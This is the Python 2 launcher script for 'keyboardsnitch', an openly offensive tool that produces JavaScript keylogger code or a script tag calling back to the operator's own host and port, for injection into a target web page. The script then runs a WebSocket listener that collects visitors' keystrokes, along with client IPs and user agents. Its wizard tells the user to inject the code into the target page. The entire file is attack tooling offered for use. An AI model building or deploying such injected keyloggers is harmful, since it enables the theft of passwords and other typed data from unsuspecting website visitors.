'''
 __                 ___.                          .___               .__  __         .__     
|  | __ ____ ___.__.\_ |__   _________ _______  __| _/   ______ ____ |__|/  |_  ____ |  |__  
|  |/ // __ <   |  | | __ \ /  _ \__  \\_  __ \/ __ |   /  ___//    \|  \   __\/ ___\|  |  \ 
|    <\  ___/\___  | | \_\ (  <_> ) __ \|  | \/ /_/ |   \___ \|   |  \  ||  | \  \___|   Y  \
|__|_ \\___  > ____| |___  /\____(____  /__|  \____ |  /____  >___|  /__||__|  \___  >___|  /
     \/    \/\/          \/           \/           \/       \/     \/              \/     \/ k

Author:        Gabriel 's0lst1c3' Ryan
Email:         gabriel@solstice.me
Contribute at: github.com/s0lst1c3/keyboardsnitch
Description:   Inject code into web page. Log keystrokes.

'''
import wskeyloggerd
import json
import sys

from argparse import ArgumentParser
from config import WEBSOCKETS_SOURCE, WSKEYLOGGER_SOURCE

def print_ws_source():

    print '<script type="text/javascript" src="%s"></script>' % WEBSOCKETS_SOURCE

def print_wskeylogger_code(lhost, lport):

    with open(WSKEYLOGGER_SOURCE) as fd:
        print fd.read().replace('KEYBOARDSNITCH_IP', lhost).replace('KEYBOARDSNITCH_PORT', str(lport))

def print_wskeylogger_tag(lhost, lport):

    print '<script type="text/javascript" src="http://%s:%s/"></script>' % (lhost, lport)

def run_wizard():

    print 'Please enter your ip address: '
    lhost = raw_input(': ')

    print 'Please enter port on which to run keylogger: '
    lport = int(raw_input(': '))
    
    while True:

        print 'Would you like to show client ip addresses in output?'
        show_clients = raw_input('Please enter yes or no: ').lower()
        if show_clients in ['yes', 'no', 'y', 'n']:
            show_clients = True
            break
        print 'Invalid input.'

    while True:

        print 'Would you like to show hosts in output?'
        show_hosts = raw_input('Please enter yes or no: ').lower()
        if show_hosts in ['yes', 'no', 'y', 'n']:
            show_hosts = True
            break

        print 'Invalid input.'

    while True:

        print 'Would you like to show user_agents in output?'
        show_user_agents = raw_input('Please enter yes or no: ').lower()
        if show_user_agents in ['yes', 'no', 'y', 'n']:
            show_user_agents = True
            break

        print 'Invalid input.'

    while True:

        print 'Would you like to...'
        print '1. Inject keylogging javascript code directly into target page'
        print '2. Link to keylogger code using a script tag or similar'
        
        choice = raw_input('Please enter 1 or 2: ')

        if choice == '1':
            print_wskeylogger_code(lhost, lport)
            break
        elif choice == '2':
            print_wskeylogger_tag(lhost, lport)
            break

        print 'Invalid input'

    print
    print 'Copy the javascript code shown above and then inject it into the target web page'

    raw_input('Press enter to continue . . .')

    return {

        'show_user_agents' : show_user_agents,
        'show_clients' : show_clients,
        'show_hosts' : show_hosts,
        'lhost' : lhost,
        'lport' : lport,
        'debug' : False,
    }

def set_configs():

    parser = ArgumentParser()

    parser.add_argument('--wizard',
                    dest='wizard',
                    action='store_true',
                    required=False,
                    help='Run in interactive mode.')

    parser.add_argument('--hosts',
                    dest='show_hosts',
                    action='store_true',
                    required=False,
                    help='Show hosts in output')

    parser.add_argument('--clients',
                    dest='show_clients',
                    action='store_true',
                    required=False,
                    help='Show client ip addrs in output')

    parser.add_argument('--user-agents',
                    dest='show_user_agents',
                    action='store_true',
                    required=False,
                    help='Show client user agents in output')

    parser.add_argument('--debug',
                    dest='debug',
                    action='store_true',
                    required=False,
                    help='Run in debug mode')

    parser.add_argument('--lhost',
                    dest='lhost',
                    type=str,
                    required=False,
                    help='Your ip address')

    parser.add_argument('--lport',
                    dest='lport',
                    type=int,
                    required=False,
                    help='Port on which to run keylogger.')

    parser.add_argument('--inject-code',
                    dest='inject_code',
                    action='store_true',
                    required=False,
                    help='Get keylogger code to inject into webpage.')

    parser.add_argument('--ws-source',
                    dest='ws_source',
                    action='store_true',
                    required=False,
                    help='Get websockets source tag (inject this first).')

    parser.add_argument('--inject-tag',
                    dest='inject_tag',
                    action='store_true',
                    required=False,
                    help='Get url to place in script tag linking to keyloggering js code.')


    args = parser.parse_args()

    if args.wizard:
        return run_wizard()
    elif args.ws_source:
        print_ws_source()
        sys.exit(0)
    elif args.lport is None or args.lhost is None:
        parser.print_help()
        print
        print '--lport and --lhost are mandatory flags unless the --wizard or --ws-source flags are in use'
        sys.exit(1)
    elif args.inject_tag:
        print_wskeylogger_tag(args.lhost, args.lport)
        sys.exit(0)
    elif args.inject_code:
        print_wskeylogger_code(args.lhost, args.lport)
        sys.exit(0)
    else:
        return args.__dict__

if __name__ == '__main__':

    configs = set_configs()

    print json.dumps(configs, indent=True)
    wskeyloggerd.run(configs)
